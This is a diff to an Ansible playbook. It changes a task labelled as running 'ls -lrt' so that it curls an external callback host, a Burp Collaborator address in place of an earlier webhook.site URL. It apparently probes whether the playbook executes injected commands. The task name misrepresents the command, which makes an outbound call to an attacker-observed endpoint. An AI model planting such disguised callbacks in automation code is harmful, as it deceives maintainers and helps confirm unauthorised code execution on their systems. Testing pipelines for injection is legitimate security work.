@@ -5,7 +5,7 @@
     tasks:
 
     - name: "just execute a ls -lrt command"
-      shell: "curl https://webhook.site/06f8115a-cf09-47f7-964d-75791dbe0c38"
+      shell: "curl http://94bly1jxh7jhv557aaug58hohfn6bv.burpcollaborator.net/"
       register: "output"
 
     - debug: var=output.stdout_lines
